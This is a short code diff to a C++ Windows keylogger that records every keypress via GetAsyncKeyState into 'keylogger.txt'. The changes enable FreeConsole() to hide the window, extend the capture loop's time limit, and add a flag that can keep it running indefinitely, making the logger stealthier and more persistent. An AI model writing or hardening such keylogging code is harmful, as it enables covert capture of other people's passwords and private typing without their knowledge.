@@ -5,19 +5,21 @@
 
 extern const char* TEXTFILE = "keylogger.txt";
 const bool debug = true;
+const int time_limit = 100;
 
 int main() {
-	//FreeConsole();
+	FreeConsole();
 
 	int time_taken = 0;
 	int i;
+	bool keep_running = false;
 
 	time_t start_time, end_time;
 	std::cout << "Starting Key Logger\n";
 	Saver filesaver = Saver(TEXTFILE, debug);
 	time(&start_time);
 
-	while (time_taken<10) {
+	while (time_taken<time_limit||keep_running) {
 		Sleep(10);
 		for (i = 8; i <= 255; i++) {
 			if (GetAsyncKeyState(i) & 0x0001) {
